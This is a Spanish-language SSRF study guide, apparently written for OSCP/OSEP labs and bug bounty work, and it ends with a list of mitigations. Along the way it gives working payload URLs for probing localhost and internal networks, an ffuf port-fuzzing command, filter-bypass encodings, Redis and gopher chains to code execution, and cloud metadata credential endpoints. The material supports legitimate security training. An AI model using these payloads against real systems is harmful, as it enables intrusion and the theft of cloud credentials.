## 📚 **Índice**

- [[#🎯 1. ¿Qué es realmente un SSRF ?]]
- [[#🔍 2. El Patrón Universal de SSRF]]
- [[#🖥️ 3. Escenario 1 — SSRF en la misma máquina (localhost)]]
    - [[#🔥 3.1 Flujo real de explotación]]
- [[#🚪 4. Escenario 2 — Acceso a red interna (la joya del SSRF)]]
    - [[#🛰️ 4.1 Enumeración interna]]
- [[#🧩 5. Cómo se ve un SSRF real en aplicaciones modernas]]
- [[#🧨 6. Bypass de filtros y evasión profesional]]
    - [[#✔ 6.1 Blacklist bypass]]
    - [[#✔ 6.2 Whitelist bypass]]
    - [[#✔ 6.3 URL parser confusion]]
    - [[#✔ 6.4 DNS rebinding (AVANZADO)]]
- [[#💣 7. SSRF → RCE (cuando esto pasa, ganaste)]]
- [[#☁️ 8. Cloud SSRF (Metadata Extraction)]]
- [[#🐳 9. Laboratorio Docker (para practicar SSRF bien)]]


---

# 🎯 **1. ¿Qué es realmente un SSRF ?**

**SSRF = hacer que un servidor realice solicitudes HTTP/HTTPS hacia recursos que TÚ elijas.**

Concepto clave:

> _“No eres tú haciendo la solicitud. Es el **servidor**. Tú solo le dices a dónde.”_

Esto importa porque:

- El servidor **sí puede** acceder a:
    
    - `localhost`
        
    - `127.0.0.1`
        
    - `0.0.0.0`
        
    - Subredes internas (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`)
        
    - Microservicios
        
    - Servidores privados
        
    - Recursos protegidos
        
- Tú NO puedes acceder a esas redes directamente → pero a través del SSRF, sí.
    

**El SSRF es un puente. Es pivoting sin necesidad de un shell.**

---

# 🔍 **2. El Patrón Universal de SSRF**

Apréndelo y detectas SSRF siempre.

Busca funcionalidad donde:

- El usuario ingresa una **URL**.
    
- El servidor **descarga algo** por ti.
    
- El servidor **"incluye", "preview", "fetch", "importa", "lookup"** contenido remoto.
    

Palabras clave peligrosas:

- `url=`
    
- `target=`
    
- `endpoint=`
    
- `fetch=`
    
- `path=`
    
- `callback=`
    
- `redirect=`
    
- `image=`
    
- `avatar=`
    
- `webhook=`
    
- `export=`
    
- `include=` (muy crítico cuando usan `allow_url_fopen` o `allow_url_include`)
    

---

# 🖥️ **3. Escenario 1 — SSRF en la misma máquina (localhost)**

(El caso más común en labs OSCP/OSEP)

Tienes un endpoint vulnerable:

```
http://target/utility.php?url=http://example.com
```

Reemplazas la URL por:

```
http://target/utility.php?url=http://localhost
```

Si el script hace `file_get_contents()` o `curl_exec()`, entonces:

- La máquina **hace la petición a sí misma**.
    
- TÚ puedes ver servicios internos como:
    
    - Apache
        
    - Nginx
        
    - Paneles admin ocultos
        
    - phpinfo
        
    - APIs en desarrollo
        
    - Servicios internos REST
        

---

## 🔥 **3.1 Flujo real de explotación**

### Paso 1 — Probar si pega a localhost

```
http://target/utility.php?url=http://127.0.0.1
```

Si responde: **SSRF confirmado**.

### Paso 2 — Enumerar servicios internos

Fuzz al clásico:

```
http://target/utility.php?url=http://127.0.0.1:FUZZ
```

Con SecLists:

```
ffuf -w /path/ports.txt -u "http://target/utility.php?url=http://127.0.0.1:FUZZ"
```

### Paso 3 — Acceder a endpoints internos

Ejemplos típicos:

```
http://127.0.0.1:8000/debug
http://127.0.0.1:8080/manager
http://127.0.0.1:5000/api/v1/
http://127.0.0.1/server-status
http://127.0.0.1/admin
http://127.0.0.1/metrics
```

---

# 🚪 **4. Escenario 2 — Acceso a red interna (la joya del SSRF)**

### El escenario:

- Tienes una máquina expuesta al público.
    
- Esa máquina está conectada a una **subred interna** que tú no puedes ver.
    
- La app vulnerable permite que esa máquina haga peticiones internas.
    

Entonces puedes hacer:

```
http://target/utility.php?url=http://192.168.1.25:8080
```

Ejemplo directo:

```
http://target/utility.php?url=http://10.0.0.15:22
```

### Si ves banners como:

```
SSH-2.0-OpenSSH_8.2p1
```

→ Es que **llegaste a la red interna**.

---

## 🛰️ **4.1 Enumeración interna**

### Enumerar máquinas activas:

```
http://target/utility.php?url=http://10.0.0.FUZZ
```

### Enumerar puertos internos en máquinas vivas:

```
http://target/utility.php?url=http://10.0.0.5:FUZZ
```

### Buscar servicios interesantes:

- Jenkins: `:8080`
    
- Tomcat: `:8080/manager`
    
- Redis: `:6379`
    
- MySQL: `:3306`
    
- RDP: `:3389`
    
- SMB: `:445`
    
- RabbitMQ: `:15672`
    
- Admin dashboards ocultos
    

---

# 🧩 **5. Cómo se ve un SSRF real en aplicaciones modernas**

### 1. Previsualización de enlaces (Facebook/Twitter/Slack style)

```
/preview?url=<url>
```

### 2. Webhooks

```
POST /webhook/test  
{ "callback": "http://127.0.0.1:5000/debug" }
```

### 3. Importación de imágenes

```
/fetch?img=http://example.com/image.jpg
```

### 4. Integraciones OAuth

SSRF muy común en:

```
redirect_uri=
```

---

# 🧨 **6. Bypass de filtros y evasión profesional**

## ✔ 6.1 Blacklist bypass

Si bloquean `"127.0.0.1"`:

```
http://2130706433       (representación decimal)
http://0177.0.0.1       (octal)
http://127.1            (autocompleta)
http://[::1]            (IPv6)
http://localhost@evil.com
```

## ✔ 6.2 Whitelist bypass

Si solo permiten `http://example.com/`:

```
http://example.com@127.0.0.1
http://example.com.evil.com
```

## ✔ 6.3 URL parser confusion

Muchos parsers solo leen hasta `#`:

```
http://127.0.0.1#example.com
```

## ✔ 6.4 DNS rebinding (AVANZADO)

- Primer request → DNS apunta a IP pública.
    
- Segundo request → DNS apunta a IP interna.
    
- Servidores vulnerables aceptan el cambio.
    

---

# 💣 **7. SSRF → RCE (cuando esto pasa, ganaste)**

### 1. SSRF hacia Redis:

```
http://target/?url=http://internal:6379/CONFIG=SET%20dir%20/var/www/html
```

### 2. SSRF hacia Gopher (cuando PHP usa curl con protocols=ALL)

Ejemplo de chain poderoso:

```
gopher://127.0.0.1:3306/_<payload binario MySQL>
```

### 3. SSRF hacia servicios con API interna expuesta

- Docker API sin auth (RCE total)
    
- Consul
    
- Jenkins script console
    
- AWS lambda internal API
    

---

# ☁️ **8. Cloud SSRF (Metadata Extraction)**

AWS:

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

GCP:

```
http://169.254.169.254/computeMetadata/v1/
```

Azure:

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

Esto es **oro puro** en bug bounty.

---

# 🐳 **9. Laboratorio Docker (para practicar SSRF bien)**

### Crear red interna:

```
docker network create --subnet=172.20.0.0/16 --driver=bridge red_interna
```

### Conectar máquinas:

```
docker run -d --name web --network red_interna nginx
docker run -d --name db --network red_interna mysql
docker run -d --name api --network red_interna myapi
```

Tu SSRF irá así:

```
http://target/utility.php?url=http://172.20.0.5:8080
```

Puedes practicar EXACTAMENTE los escenarios del OSCP/OSEP.

---

# 🛡️ **10. Mitigación.**

- Validar URLs con whitelist estricta.
    
- Usar DNS pinning.
    
- Deshabilitar protocolos peligrosos: `gopher://`, `file://`, `dict://`, `ftp://`.
    
- Restringir tráfico saliente del servidor (Egress filtering).
    
- No permitir conexiones a `localhost`, `127.0.0.0/8`, `169.254.0.0/16`.
    
- Timeouts cortos y HTTP methods limitados.
    

---
